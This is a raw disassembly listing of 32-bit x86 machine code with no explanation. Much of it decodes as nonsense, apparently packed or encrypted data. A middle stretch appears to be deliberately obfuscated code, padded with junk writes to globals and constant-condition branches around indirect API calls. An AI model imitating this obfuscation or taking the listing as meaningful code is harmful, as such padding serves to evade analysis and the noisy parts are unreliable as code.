  404b81:	jle    0x404bcf
  404b83:	mov    al,0xff
  404b85:	sahf   
  404b86:	or     edi,0xffffffb6
  404b89:	mov    bl,0x85
  404b8b:	mov    cl,0xd2
  404b8d:	mov    ch,0xc0
  404b8f:	daa    
  404b90:	(bad)  
  404b92:	icebp  
  404b93:	fdivr  DWORD PTR [ebx]
  404b95:	(bad)  
  404b96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b97:	imul   esi,DWORD PTR [ebx],0x506f6fe2
  404b9d:	push   ds
  404b9e:	in     al,dx
  404b9f:	inc    ebp
  404ba0:	xchg   BYTE PTR [ecx-0x73],ah
  404ba3:	jno    0x404b8c
  404ba5:	jb     0x404b56
  404ba7:	fcomp  QWORD PTR [ebp+0x6960c8df]
  404bad:	or     edi,ebp
  404baf:	xchg   BYTE PTR [eax-0x6e],bh
  404bb2:	or     ah,BYTE PTR [ecx+0x2b]
  404bb5:	mov    cl,0x99
  404bb7:	dec    esp
  404bb8:	add    eax,DWORD PTR [edx]
  404bba:	inc    edx
  404bbb:	dec    esi
  404bbc:	mov    bl,0x78
  404bbe:	push   ebp
  404bbf:	popa   
  404bc0:	ds mov dh,0xce
  404bc3:	ret    0x69c5
  404bc6:	rcl    BYTE PTR [esi],1
  404bc8:	xor    al,0x42
  404bca:	mov    bh,0x62
  404bcc:	xchg   edi,eax
  404bcd:	push   esi
  404bce:	test   al,0xa3
  404bd0:	mov    ah,0xcc
  404bd2:	out    0xdb,al
  404bd4:	adc    eax,0xc1477ba
  404bd9:	and    eax,0xb0553954
  404bde:	mov    edx,0x8307a7a5
  404be3:	out    dx,eax
  404be4:	mov    ah,0x63
  404be6:	jmp    0x1412a21b
  404beb:	jb     0x404bad
  404bed:	leave  
  404bee:	jp     0x404bc8
  404bf0:	out    0xdf,eax
  404bf2:	xchg   edx,eax
  404bf3:	sbb    DWORD PTR [edx-0x6c],esp
  404bf6:	and    BYTE PTR [ecx-0x12],0xfe
  404bfa:	std    
  404bfb:	pop    ds
  404bfc:	scas   al,BYTE PTR es:[edi]
  404bfd:	mov    edx,0x5a597d1
  404c02:	push   edi
  404c03:	push   cs
  404c04:	push   ecx
  404c05:	leave  
  404c06:	imul   ebp,DWORD PTR [eax+0x63fe0650],0x3c
  404c0d:	push   ebp
  404c0e:	mov    ch,0xdb
  404c10:	or     al,0x16
  404c12:	dec    eax
  404c13:	xor    eax,0x638113d3
  404c18:	ds ret 0xd348
  404c1c:	stos   DWORD PTR es:[edi],eax
  404c1d:	daa    
  404c1e:	int3   
  404c1f:	aad    0xb3
  404c21:	int3   
  404c22:	dec    ebx
  404c23:	(bad)  
  404c24:	sbb    al,0x49
  404c26:	(bad)  
  404c27:	fiadd  WORD PTR [edi-0x355c0a01]
  404c2d:	pop    edi
  404c2e:	daa    
  404c2f:	mov    dl,0x93
  404c31:	sbb    DWORD PTR [ecx+edi*8+0x2c2642ba],0x3c
  404c39:	add    ebx,DWORD PTR [esi]
  404c3b:	je     0x404c24
  404c3d:	cs pop esi
  404c3f:	in     eax,0xac
  404c41:	(bad)  
  404c42:	pusha  
  404c43:	scas   eax,DWORD PTR es:[edi]
  404c44:	jbe    0x404c20
  404c46:	hlt    
  404c47:	add    esi,ecx
  404c49:	shl    BYTE PTR [ecx],0xec
  404c4c:	repnz (bad) 
  404c4e:	scas   al,BYTE PTR es:[edi]
  404c4f:	fldcw  WORD PTR [edx-0x3d21e5a1]
  404c55:	xor    al,0x8d
  404c57:	stos   DWORD PTR es:[edi],eax
  404c58:	add    eax,0xfce3fce
  404c5d:	dec    edi
  404c5e:	cmp    ecx,esp
  404c60:	in     al,0xfd
  404c62:	and    eax,0x2355404a
  404c67:	daa    
  404c68:	xor    ah,dh
  404c6a:	mov    BYTE PTR [eax+0x6e],al
  404c6d:	loopne 0x404c41
  404c6f:	jno    0x404c16
  404c71:	inc    esi
  404c72:	ins    DWORD PTR es:[edi],dx
  404c73:	int    0xbb
  404c75:	xor    bl,BYTE PTR [ecx-0x80]
  404c78:	cld    
  404c79:	imul   DWORD PTR [edi-0x2b]
  404c7c:	mov    edx,0x44afe86
  404c81:	push   cs
  404c82:	push   esp
  404c83:	dec    ecx
  404c84:	fisttp QWORD PTR [ecx+esi*8-0x13]
  404c88:	enter  0xd25b,0xea
  404c8c:	std    
  404c8d:	xchg   ecx,eax
  404c8e:	pop    ss
  404c8f:	jecxz  0x404c40
  404c91:	shr    BYTE PTR [ecx+0x22],0xd4
  404c95:	imul   ecx,DWORD PTR [ebp-0x1d],0x22075e82
  404c9c:	mov    BYTE PTR [ecx-0x517da670],cl
  404ca2:	in     eax,dx
  404ca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ca4:	xor    esi,DWORD PTR [eax+ebp*2+0x42f8972b]
  404cab:	(bad)  
  404cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cad:	jnp    0x404ca4
  404caf:	aad    0xa
  404cb1:	inc    edi
  404cb2:	(bad)  
  404cb3:	pop    eax
  404cb4:	aam    0xe6
  404cb6:	mov    dl,dl
  404cb8:	sbb    al,0x2a
  404cba:	lods   eax,DWORD PTR ds:[esi]
  404cbb:	jmp    0xda1b21d5
  404cc0:	cs dec ecx
  404cc2:	bound  ecx,QWORD PTR [ebx-0x63d615ca]
  404cc8:	add    bh,0xdb
  404ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ccc:	mov    cs,eax
  404cce:	mov    bl,BYTE PTR [ebp-0x5e]
  404cd1:	icebp  
  404cd2:	jle    0x404cfc
  404cd4:	scas   eax,DWORD PTR es:[edi]
  404cd5:	xchg   bh,dl
  404cd7:	mov    ebp,eax
  404cd9:	retf   
  404cda:	jae    0x404c85
  404cdc:	es jbe 0x404d1e
  404cdf:	or     ebp,DWORD PTR [esi-0x76]
  404ce2:	push   ds
  404ce3:	div    BYTE PTR [ebx+0x32]
  404ce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ce7:	test   eax,0xcc1720e9
  404cec:	aaa    
  404ced:	lock lea ecx,[ebp-0x8]
  404cf1:	or     al,0xb1
  404cf3:	xor    DWORD PTR [esi+ebx*8-0x1f4ea3c7],ecx
  404cfa:	test   DWORD PTR [edx],ebp
  404cfc:	adc    BYTE PTR [edi+0x39],ah
  404cff:	sbb    esp,esp
  404d01:	mov    al,0xac
  404d03:	iret   
  404d04:	popf   
  404d05:	retf   0x8307
  404d08:	add    BYTE PTR ds:0x403eca88,ch
  404d0e:	pop    eax
  404d0f:	dec    edx
  404d10:	jo     0x404d0b
  404d12:	add    DWORD PTR [edi-0x53],edx
  404d15:	fcom   QWORD PTR [eax+0x42020ec5]
  404d1b:	add    al,0x2
  404d1d:	and    BYTE PTR [edx+0xcf13cb1],0x1b
  404d24:	pop    ebx
  404d25:	or     al,0xad
  404d27:	xchg   ebx,eax
  404d28:	and    bh,BYTE PTR [edx+0x60bdd546]
  404d2e:	jle    0x404d59
  404d30:	gs push esi
  404d32:	rcr    DWORD PTR [esi+0x1e],0x27
  404d36:	and    eax,0x8fecf856
  404d3b:	and    ch,BYTE PTR [edi+0x3f]
  404d3e:	inc    esp
  404d3f:	pushf  
  404d40:	ret    
  404d41:	test   DWORD PTR ss:[ecx],esp
  404d44:	dec    ecx
  404d45:	(bad)  
  404d46:	adc    eax,0x86c472bc
  404d4b:	enter  0x4d32,0xc2
  404d4f:	test   edx,ebx
  404d51:	push   ebx
  404d52:	xchg   BYTE PTR [edx+0x6bcae316],cl
  404d58:	inc    ebp
  404d59:	clc    
  404d5a:	mov    DWORD PTR [eax+0x737e1203],ecx
  404d60:	or     al,0xe9
  404d62:	pop    eax
  404d63:	nop
  404d64:	sub    eax,0xc5bc94d
  404d69:	(bad)  
  404d6b:	sub    cl,BYTE PTR [eax]
  404d6d:	pop    ebx
  404d6e:	popa   
  404d6f:	(bad)  
  404d72:	rol    BYTE PTR [esi-0x3968d1f3],cl
  404d78:	aaa    
  404d79:	lds    edi,FWORD PTR [edi+0x3d612f92]
  404d7f:	sub    DWORD PTR ds:0xdb926866,0xd2256ec0
  404d89:	mov    eax,0x1caa0c91
  404d8e:	jge    0x404d56
  404d90:	dec    edi
  404d91:	push   ds
  404d92:	adc    al,0xf3
  404d94:	and    DWORD PTR [edx],ebx
  404d96:	(bad)  
  404d97:	pop    ecx
  404d98:	mov    ecx,0x21fe91d3
  404d9d:	rcr    edi,1
  404d9f:	lods   al,BYTE PTR ds:[esi]
  404da0:	out    dx,al
  404da1:	pop    ebp
  404da2:	sbb    al,0xea
  404da4:	fcomp  st(6)
  404da6:	pushf  
  404da7:	mov    DWORD PTR [edx],eax
  404da9:	jp     0x404ddc
  404dab:	imul   esi,DWORD PTR [esi+0x4b],0x2920de85
  404db2:	push   ss
  404db3:	xor    DWORD PTR [eax+0x1a],esi
  404db6:	test   ecx,ebp
  404db8:	jae    0x404d85
  404dba:	cld    
  404dbb:	loopne 0x404ded
  404dbd:	mov    bh,0xa1
  404dbf:	mov    ebp,0x3138d4f2
  404dc4:	cmp    eax,0x7586b56e
  404dc9:	xchg   edx,eax
  404dca:	hlt    
  404dcb:	push   ebx
  404dcc:	loop   0x404dff
  404dce:	adc    edi,DWORD PTR [ebx]
  404dd0:	shr    BYTE PTR [esi+0x27],cl
  404dd3:	push   esi
  404dd4:	xchg   edi,eax
  404dd5:	inc    ebx
  404dd6:	pop    eax
  404dd7:	cwde   
  404dd8:	or     eax,0xfed4da39
  404ddd:	loop   0x404e37
  404ddf:	inc    esp
  404de0:	jge    0x404e2c
  404de2:	daa    
  404de3:	es add eax,0x22e530ff
  404de9:	imul   esp,DWORD PTR [eax+0x2c9835c6],0x4834c0c9
  404df3:	out    dx,eax
  404df4:	add    al,0x87
  404df6:	(bad)  
  404df7:	imul   edi,ecx,0x874ab081
  404dfd:	lods   eax,DWORD PTR ds:[esi]
  404dfe:	push   esi
  404dff:	push   esi
  404e00:	push   eax
  404e01:	loop   0x404dfe
  404e03:	neg    eax
  404e05:	and    DWORD PTR ds:0xdaa3340d,eax
  404e0b:	dec    ebx
  404e0c:	dec    ecx
  404e0d:	(bad)  
  404e0e:	loope  0x404e4e
  404e10:	or     eax,0xcad486ba
  404e15:	ret    0x88e8
  404e18:	or     DWORD PTR [esi],eax
  404e1a:	jmp    0xd098:0x46bdba42
  404e21:	push   cs
  404e22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e23:	ins    BYTE PTR es:[edi],dx
  404e24:	in     al,0x49
  404e26:	cmp    ecx,DWORD PTR [ecx+ebp*2]
  404e29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e2a:	sbb    ch,bh
  404e2c:	cmp    DWORD PTR [ebx+0x45f0d47e],ebx
  404e32:	push   ss
  404e33:	cmp    ecx,DWORD PTR [ebp+0x1737791e]
  404e39:	mov    es,WORD PTR [edi+0x48]
  404e3c:	enter  0x7ac9,0x77
  404e40:	xor    DWORD PTR [edi+0x75e018df],edx
  404e46:	xor    bh,BYTE PTR [ebp-0x2a]
  404e49:	sub    eax,ebx
  404e4b:	div    dh
  404e4d:	push   ss
  404e4e:	mov    ds:0x2e2bfdbf,eax
  404e53:	(bad)  
  404e54:	shl    DWORD PTR [edi-0x1e850637],cl
  404e5a:	stos   BYTE PTR es:[edi],al
  404e5b:	not    ch
  404e5d:	mov    cl,0xeb
  404e5f:	int    0x70
  404e61:	push   ebp
  404e62:	fs mov cx,0x7415
  404e67:	das    
  404e68:	repnz push edx
  404e6a:	jno    0x404e8a
  404e6c:	mov    edi,0xf4742e56
  404e71:	sbb    ebp,DWORD PTR [eax+0x1c]
  404e74:	icebp  
  404e75:	pop    ecx
  404e76:	xor    eax,0x1e8dcf96
  404e7b:	fcmove st,st(6)
  404e7d:	or     eax,0xc7acf68b
  404e82:	mov    eax,ds:0xcf4c7dd8
  404e87:	mov    dh,0x5e
  404e89:	xor    bl,dh
  404e8b:	shl    BYTE PTR [ebx-0x70],1
  404e8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e8f:	ins    DWORD PTR es:[edi],dx
  404e90:	icebp  
  404e91:	pop    esi
  404e92:	in     al,0xd2
  404e94:	pop    ds
  404e95:	nop
  404e96:	ds pop ecx
  404e98:	cmc    
  404e99:	(bad)  
  404e9a:	sti    
  404e9b:	cmp    al,0x46
  404e9d:	fs inc ebx
  404e9f:	test   DWORD PTR [esi],0x3a65327
  404ea5:	test   BYTE PTR [edx+0x5128cc74],ah
  404eab:	ror    BYTE PTR [esi+eiz*2-0x25],1
  404eaf:	xchg   edx,eax
  404eb0:	ror    BYTE PTR [ebx+0x7d136404],1
  404eb6:	fucomip st,st(3)
  404eb8:	rcr    ebp,cl
  404eba:	cmp    eax,0xd49ae1c
  404ebf:	xor    eax,0x334c5330
  404ec4:	sub    ebp,ebp
  404ec6:	add    edx,edx
  404ec8:	arpl   WORD PTR [eax+0x39e7e9d],bp
  404ece:	xor    al,BYTE PTR [edx]
  404ed0:	lea    ebp,[eax]
  404ed2:	hlt    
  404ed3:	repnz sbb eax,0x97114e90
  404ed9:	add    ebp,esi
  404edb:	or     al,0x45
  404edd:	dec    edx
  404ede:	in     al,dx
  404edf:	xchg   ebp,eax
  404ee0:	push   ebp
  404ee1:	add    BYTE PTR ds:0xa2ade4d,dh
  404ee7:	xchg   edi,eax
  404ee8:	push   esp
  404ee9:	in     eax,0xae
  404eeb:	ins    DWORD PTR es:[edi],dx
  404eec:	xor    BYTE PTR [esi-0x39],dl
  404eef:	xlat   BYTE PTR ds:[ebx]
  404ef0:	xlat   BYTE PTR ds:[ebx]
  404ef1:	or     esi,DWORD PTR [edx]
  404ef3:	setl   bl
  404ef6:	lods   eax,DWORD PTR ds:[esi]
  404ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ef8:	push   cs
  404ef9:	lea    esp,[esi+0x1f]
  404efc:	xchg   esi,eax
  404efd:	pusha  
  404efe:	inc    ebx
  404eff:	test   BYTE PTR [edx-0x70],bh
  404f02:	das    
  404f03:	outs   dx,DWORD PTR ds:[esi]
  404f04:	and    eax,0xb8073d99
  404f09:	std    
  404f0a:	or     BYTE PTR [edi-0x29],al
  404f0d:	or     ebx,ebp
  404f0f:	icebp  
  404f10:	hlt    
  404f11:	jmp    0x404f06
  404f13:	add    DWORD PTR [ebp-0x741843d],ebp
  404f19:	in     al,dx
  404f1a:	and    dl,BYTE PTR [esi-0x16]
  404f1d:	mov    eax,ds:0x635378e5
  404f22:	sbb    ch,BYTE PTR [ebp+0x69249e23]
  404f28:	mov    eax,ds:0xb0005b9
  404f2d:	push   ebp
  404f2e:	in     al,0x81
  404f30:	sbb    eax,0x4282cb
  404f35:	push   esi
  404f36:	je     0x404f38
  404f38:	add    cl,al
  404f3a:	loope  0x404f5a
  404f3c:	lea    ecx,[edx+eax*1]
  404f3f:	adc    edx,DWORD PTR ds:0x4282d7
  404f45:	mov    eax,DWORD PTR [ebx]
  404f47:	or     DWORD PTR ds:0x4283eb,edi
  404f4d:	mov    edx,DWORD PTR [ebx+0x4]
  404f50:	mov    DWORD PTR ds:0x4283c7,0x1480
  404f5a:	shrd   eax,edx,0x2
  404f5e:	adc    DWORD PTR ds:0x4283d3,0x1a3a
  404f68:	shr    edx,0x2
  404f6b:	cmp    DWORD PTR ds:0x4283d3,0x0
  404f72:	mov    DWORD PTR ds:0x428363,ebx
  404f78:	mov    DWORD PTR ds:0x4283db,0x56b3
  404f82:	mov    DWORD PTR ds:0x4282bb,0x1c7d
  404f8c:	jmp    0x405004
  404f91:	mov    DWORD PTR ds:0x42828f,ebx
  404f97:	mov    DWORD PTR ds:0x4282c7,0x5683
  404fa1:	cmp    DWORD PTR ds:0x4283d3,0x0
  404fa8:	jg     0x404fd2
  404fae:	push   0x428f
  404fb3:	push   DWORD PTR [ebp-0x14]
  404fb6:	call   DWORD PTR ds:0x428ddc
  404fbc:	and    edx,DWORD PTR ds:0x428373
  404fc2:	sub    DWORD PTR ds:0x42829f,ecx
  404fc8:	or     DWORD PTR ds:0x428293,0xf0b
  404fd2:	adc    DWORD PTR ds:0x4281cf,0x4903
  404fdc:	mov    edx,DWORD PTR ds:0x4283b3
  404fe2:	mov    edx,DWORD PTR [edx]
  404fe4:	add    DWORD PTR ds:0x4281bb,edx
  404fea:	xor    edx,edx
  404fec:	xor    edx,DWORD PTR ds:0x4281b3
  404ff2:	xor    DWORD PTR ds:0x4282f3,edx
  404ff8:	mov    edx,DWORD PTR ds:0x4282c7
  404ffe:	add    DWORD PTR ds:0x4283eb,edx
  405004:	mov    DWORD PTR [ebp-0x1c],eax
  405007:	mov    eax,ds:0x4282f3
  40500c:	add    DWORD PTR ds:0x4282cb,eax
  405012:	mov    eax,DWORD PTR [ebx]
  405014:	sub    edx,0x532
  40501a:	mov    edx,DWORD PTR [ebx+0x4]
  40501d:	xor    DWORD PTR [ebp-0x1c],edi
  405020:	mov    edx,eax
  405022:	xor    eax,eax
  405024:	add    DWORD PTR ds:0x4283d3,0x32cc
  40502e:	or     eax,DWORD PTR [ebp-0x1c]
  405031:	sub    DWORD PTR ds:0x4283df,0x1679
  40503b:	shl    edx,0x1e
  40503e:	and    DWORD PTR ds:0x4281c7,edi
  405044:	imul   eax,ecx
  405047:	mov    ecx,DWORD PTR [ebx]
  405049:	mov    edx,DWORD PTR [ebx+0x4]
  40504c:	shrd   ecx,edx,0x2
  405050:	sbb    DWORD PTR ds:0x4283ef,0x5de1
  40505a:	mov    DWORD PTR [ebp-0x1c],ecx
  40505d:	sbb    DWORD PTR ds:0x4282df,0x3a7c
  405067:	mov    ecx,DWORD PTR [ebx]
  405069:	adc    DWORD PTR ds:0x4281d3,0x4282b7
  405073:	xor    DWORD PTR [ebp-0x1c],edi
  405076:	shr    edx,0x2
  405079:	adc    DWORD PTR ds:0x4283cb,ecx
  40507f:	mov    edx,DWORD PTR [ebx+0x4]
  405082:	mov    edx,ecx
  405084:	xor    ecx,ecx
  405086:	mov    DWORD PTR ds:0x4283db,0x321a
  405090:	or     ecx,DWORD PTR [ebp-0x1c]
  405093:	adc    DWORD PTR ds:0x4282cb,0x4283d7
  40509d:	shl    edx,0x1e
  4050a0:	or     DWORD PTR ds:0x4282c3,0x4282e3
  4050aa:	sub    ecx,eax
  4050ac:	mov    eax,DWORD PTR [ebp-0xc]
  4050af:	mov    DWORD PTR ds:0x428297,0x7aa6
  4050b9:	cmp    DWORD PTR [eax],ecx
  4050bb:	not    eax
  4050bd:	mov    eax,DWORD PTR [ebp-0xc]
  4050c0:	mov    DWORD PTR ds:0x4283cb,0x460d
  4050ca:	jg     0x405287
  4050d0:	mov    ecx,DWORD PTR [ebp+0x18]
  4050d3:	xor    DWORD PTR ds:0x4283db,edx
  4050d9:	mov    edx,DWORD PTR [ebp+0x1c]
  4050dc:	sbb    DWORD PTR ds:0x4283e7,0x42828b
  4050e6:	shrd   ecx,edx,0x2
  4050ea:	sbb    DWORD PTR ds:0x4282b3,0x42829f
  4050f4:	mov    DWORD PTR [ebp-0x1c],ecx
  4050f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4050fa:	xor    DWORD PTR [ebp-0x1c],edi
  4050fd:	or     DWORD PTR ds:0x4282ef,0x2ce0
  405107:	shl    ecx,0x1e
  40510a:	xor    ecx,ecx
  40510c:	and    DWORD PTR ds:0x4282cf,0x4282ab
  405116:	or     ecx,DWORD PTR [ebp-0x1c]
  405119:	shr    edx,0x2
  40511c:	or     DWORD PTR ds:0x4281b7,ebx
  405122:	mov    edx,DWORD PTR [ebp+0x1c]
  405125:	mov    DWORD PTR [ebp-0x2c],ecx
  405128:	cmp    DWORD PTR ds:0x4283db,0x0
  40512f:	mov    DWORD PTR ds:0x4281eb,edx
  405135:	mov    DWORD PTR ds:0x4283bb,ecx
  40513b:	not    edx
  40513d:	jmp    0x405212
  405142:	mov    DWORD PTR ds:0x4281cb,0x795c
  40514c:	cmp    DWORD PTR ds:0x4283db,0x0
  405153:	ja     0x40517c
  405159:	push   0x427ffc
  40515e:	push   DWORD PTR [ebp-0x24]
  405161:	push   0x6923
  405166:	call   DWORD PTR ds:0x428e04
  40516c:	or     DWORD PTR ds:0x4282c3,0xa87
  405176:	add    ecx,DWORD PTR ds:0x4283f7
  40517c:	adc    ecx,DWORD PTR ds:0x4281db
  405182:	xor    DWORD PTR ds:0x4281cb,0x1a4f
  40518c:	sbb    DWORD PTR ds:0x4282df,edx
  405192:	cmp    DWORD PTR ds:0x42833b,0x0
  405199:	mov    DWORD PTR ds:0x428367,0x66a6
  4051a3:	mov    DWORD PTR ds:0x428347,ecx
  4051a9:	mov    ecx,0x67a4
  4051ae:	jmp    0x405212
  4051b3:	mov    edx,0x2152
  4051b8:	cmp    DWORD PTR ds:0x42833b,0x0
  4051bf:	jge    0x4051e9
  4051c5:	push   DWORD PTR [ebp-0x28]
  4051c8:	push   DWORD PTR [ebp-0x28]
  4051cb:	call   DWORD PTR ds:0x428e08
  4051d1:	inc    DWORD PTR ds:0x4282d7
  4051d7:	mov    ecx,DWORD PTR ds:0x428217
  4051dd:	mov    edx,DWORD PTR ds:0x428417
  4051e3:	sub    ecx,edx
  4051e5:	imul   ecx,DWORD PTR [ecx+edx*1]
  4051e9:	xor    DWORD PTR ds:0x42833b,0x4a74
  4051f3:	mov    edx,DWORD PTR ds:0x42820f
  4051f9:	mov    edx,DWORD PTR [edx]
  4051fb:	sub    DWORD PTR ds:0x4282c3,edx
  405201:	mov    edx,DWORD PTR ds:0x428227
  405207:	mov    ecx,DWORD PTR ds:0x428417
  40520d:	sub    ecx,edx
  40520f:	and    edx,DWORD PTR [edx+ecx*1]
  405212:	mov    ecx,DWORD PTR [ebx]
  405214:	sub    DWORD PTR ds:0x4283cf,0x2089
  40521e:	mov    edx,DWORD PTR [ebx+0x4]
  405221:	shrd   ecx,edx,0x2
  405225:	shr    edx,0x2
  405228:	mov    DWORD PTR [ebp-0x1c],ecx
  40522b:	xor    edx,edx
  40522d:	xor    edx,DWORD PTR ds:0x4282df
  405233:	sub    DWORD PTR ds:0x4281e3,edx
  405239:	mov    ecx,DWORD PTR [ebx]
  40523b:	inc    edx
  40523c:	mov    edx,DWORD PTR [ebx+0x4]
  40523f:	add    DWORD PTR ds:0x4283bb,0x35fe
  405249:	xor    DWORD PTR [ebp-0x1c],edi
  40524c:	xor    edx,edx
  40524e:	xor    DWORD PTR ds:0x4281c7,0x631d
  405258:	or     edx,DWORD PTR [ebp-0x1c]
  40525b:	xor    DWORD PTR ds:0x4282cf,0x4281d3
  405265:	shl    ecx,0x1e
  405268:	and    DWORD PTR ds:0x4283eb,0x4282b7
  405272:	imul   edx,DWORD PTR [ebp-0x2c]
  405276:	add    DWORD PTR ds:0x4283e3,0x4996
  405280:	sub    DWORD PTR [eax],edx
  405282:	jmp    0x4058d5
  405287:	add    DWORD PTR ds:0x4281bb,0x42f2
  405291:	mov    ecx,DWORD PTR [esi]
  405293:	cmp    DWORD PTR ds:0x4282f3,0x0
  40529a:	mov    DWORD PTR ds:0x428283,0x7c0
  4052a4:	mov    edx,DWORD PTR ds:0x4282c3
  4052aa:	mov    DWORD PTR ds:0x42834b,0x4c43
  4052b4:	jmp    0x405321
  4052b9:	mov    DWORD PTR ds:0x4283f3,0x6b40
  4052c3:	mov    DWORD PTR ds:0x4282db,0x2bfd
  4052cd:	cmp    DWORD PTR ds:0x4282f3,0x0
  4052d4:	jae    0x4052fc
  4052da:	push   0x4280b9
  4052df:	push   0x1ca9
  4052e4:	call   DWORD PTR ds:0x428e0c
  4052ea:	add    edx,DWORD PTR ds:0x4282ab
  4052f0:	adc    edx,0x1702
  4052f6:	add    edx,DWORD PTR ds:0x4281d3
  4052fc:	and    DWORD PTR ds:0x4281df,0x3bee
  405306:	dec    edx
  405307:	xor    edx,edx
  405309:	or     edx,DWORD PTR ds:0x4282b7
  40530f:	add    DWORD PTR ds:0x4282f3,edx
  405315:	mov    edx,DWORD PTR ds:0x4282db
  40531b:	add    DWORD PTR ds:0x4281c3,edx
  405321:	mov    edx,DWORD PTR [esi+0x4]
  405324:	xor    DWORD PTR ds:0x428347,0x42827f
  40532e:	shrd   ecx,edx,0x2
  405332:	mov    DWORD PTR [ebp-0x1c],ecx
  405335:	cmp    DWORD PTR ds:0x428363,0x0
  40533c:	mov    DWORD PTR ds:0x42835f,edi
  405342:	mov    DWORD PTR ds:0x4282c7,ebx
  405348:	jmp    0x405426
  40534d:	mov    DWORD PTR ds:0x42836b,0x4d36
  405357:	mov    DWORD PTR ds:0x4283e7,0x1e95
  405361:	cmp    DWORD PTR ds:0x428363,0x0
  405368:	jb     0x405396
  40536e:	push   0x848f
  405373:	push   0x5d21
  405378:	call   DWORD PTR ds:0x428e10
  40537e:	not    ecx
  405380:	adc    DWORD PTR ds:0x4283ef,ecx
  405386:	neg    ecx
  405388:	mov    ecx,DWORD PTR ds:0x42842f
  40538e:	mov    ecx,DWORD PTR [ecx]
  405390:	sub    DWORD PTR ds:0x4283cf,ecx
  405396:	mov    ecx,DWORD PTR ds:0x42829f
  40539c:	xor    DWORD PTR ds:0x4281ab,ecx
  4053a2:	or     ecx,0x48b0
  4053a8:	sbb    DWORD PTR ds:0x4282cb,edx
  4053ae:	cmp    DWORD PTR ds:0x42834b,0x0
  4053b5:	mov    DWORD PTR ds:0x4281b7,edi
  4053bb:	not    DWORD PTR ds:0x42828b
  4053c1:	jmp    0x405426
  4053c6:	mov    DWORD PTR ds:0x4281e7,0xab0
  4053d0:	cmp    DWORD PTR ds:0x42834b,0x0
  4053d7:	jb     0x405406
  4053dd:	push   0x56df
  4053e2:	push   DWORD PTR [ebp-0x20]
  4053e5:	push   DWORD PTR [ebp-0x20]
  4053e8:	push   0x14ed
  4053ed:	push   DWORD PTR [ebp-0x24]
  4053f0:	call   DWORD PTR ds:0x428e14
  4053f6:	sub    ecx,DWORD PTR ds:0x4281eb
  4053fc:	sub    DWORD PTR ds:0x42828b,0x6432
  405406:	or     DWORD PTR ds:0x4282af,0x3285
  405410:	adc    ecx,DWORD PTR ds:0x4281df
  405416:	sub    DWORD PTR ds:0x4283e3,edi
  40541c:	mov    DWORD PTR ds:0x42828b,0x48f2
  405426:	mov    ecx,DWORD PTR [esi]
  405428:	xor    DWORD PTR [ebp-0x1c],edi
  40542b:	shl    ecx,0x1e
  40542e:	adc    DWORD PTR ds:0x4282c7,0xf0c
  405438:	xor    ecx,ecx
  40543a:	xor    DWORD PTR ds:0x42833f,0x1337
  405444:	or     ecx,DWORD PTR [ebp-0x1c]
  405447:	shr    edx,0x2
  40544a:	mov    edx,DWORD PTR ds:0x4283ef
  405450:	sub    edx,DWORD PTR ds:0x4281a3
  405456:	mov    DWORD PTR ds:0x4283ef,edx
  40545c:	jmp    0x40583a
  405461:	xchg   ecx,eax
  405462:	stc    
  405463:	xchg   ebp,eax
  405464:	out    dx,al
  405465:	ins    BYTE PTR es:[edi],dx
  405466:	push   0x6b
  405468:	jbe    0x405493
  40546a:	push   0x25
  40546c:	stos   BYTE PTR es:[edi],al
  40546d:	inc    ebp
  40546e:	mov    ds:0xb9e6beeb,al
  405473:	sbb    BYTE PTR [eax],bl
  405475:	sahf   
  405476:	adc    bl,BYTE PTR [eax]
  405478:	sbb    BYTE PTR [eax],dl
  40547a:	xor    ebp,DWORD PTR [ecx-0x8]
  40547d:	mov    ch,0xf
  40547f:	ja     0x40544b
  405481:	sub    ch,BYTE PTR [eax+0xa2523e2]
  405487:	sub    ecx,DWORD PTR [ecx]
  405489:	(bad)  
  40548a:	mov    edi,0x2ce69b0d
  40548f:	push   ecx
  405490:	inc    ebx
  405491:	fwait
  405492:	sub    DWORD PTR [ecx+0x7118f667],0x34
  405499:	repnz cs push ebp
  40549c:	das    
  40549d:	and    BYTE PTR [esi+0x314164dd],dl
  4054a3:	pop    ebx
  4054a4:	or     al,0x69
  4054a6:	or     ebx,ebx
  4054a8:	or     BYTE PTR [esi-0x2],0xfc
  4054ac:	pop    ebx
  4054ad:	mov    eax,0x6297e049
  4054b2:	mov    BYTE PTR [edx-0x64108826],ah
  4054b8:	mov    al,ds:0xddbdede
  4054bd:	jns    0x405535
  4054bf:	jg     0x40553a
  4054c1:	or     BYTE PTR [edx+edx*8],bl
  4054c4:	and    al,ah
  4054c6:	sub    ah,bh
  4054c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054c9:	clc    
  4054ca:	jo     0x4054bd
  4054cc:	inc    ebx
  4054cd:	into   
  4054ce:	stc    
  4054cf:	jb     0x405483
  4054d1:	lahf   
  4054d2:	int3   
  4054d3:	or     DWORD PTR [edx-0x2dc33fd4],esi
  4054d9:	out    dx,eax
  4054da:	inc    esp
  4054db:	jmp    0x21918263
  4054e0:	and    eax,0xfdad7f49
  4054e5:	xor    eax,0xde3ab2a5
  4054ea:	cdq    
  4054eb:	ja     0x4054b3
  4054ed:	push   ebx
  4054ee:	ja     0x405480
  4054f0:	jmp    0x405508
  4054f2:	dec    eax
  4054f3:	fcomp  QWORD PTR [eax-0x30]
  4054f6:	repnz push 0x56
  4054f9:	(bad)  
  4054fa:	daa    
  4054fb:	jne    0x4054ed
  4054fd:	andps  xmm0,XMMWORD PTR [esi]
  405500:	and    al,BYTE PTR [ebp+0xc]
  405503:	xchg   ebx,eax
  405504:	das    
  405505:	shr    BYTE PTR [ecx-0x528759ee],1
  40550b:	loopne 0x405497
  40550d:	clc    
  40550e:	js     0x4054bb
  405510:	loop   0x4054ef
  405512:	jne    0x40550e
  405514:	mov    esp,0xfbe5f837
  405519:	pop    ds
  40551a:	movq   mm5,QWORD PTR [esi+0x78]
  40551e:	imul   ecx,DWORD PTR [ecx],0x1
